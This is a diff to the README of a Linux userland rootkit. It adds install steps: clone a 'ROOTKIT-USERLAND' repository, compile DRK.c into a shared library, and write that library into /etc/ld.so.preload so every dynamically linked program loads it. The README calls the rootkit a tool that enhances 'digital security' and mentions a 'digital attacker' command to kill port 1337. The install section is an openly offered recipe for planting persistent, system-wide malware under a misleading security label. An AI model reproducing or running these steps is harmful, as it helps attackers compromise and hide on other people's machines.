@@ -2,6 +2,21 @@
 
 Welcome to my rootkit! This toolkit offers some cool and interesting functionalities designed to enhance your digital security. Let's dive into what it can do.
 
+## INSTALL MANUAL
+
+1) git clone:
+```git clone https://github.com/DARKSECshell/ROOTKIT-USERLAND```
+
+2) userland rootkit compilation
+```gcc DRK.c -o DRK.so -shared -fPIC -ldl```
+
+3) moved library for /etc/ld.so.preload
+```echo "$(pwd)/DRK.so" > /etc/ld.so.preload && ldconfig```
+
+4) Check rk loading
+```ldd /usr/bin/ls```
+
+
 ## Functionality Overview
 
 When the digital attacker issues the command to kill port 1337, an interesting sequence of events unfolds:
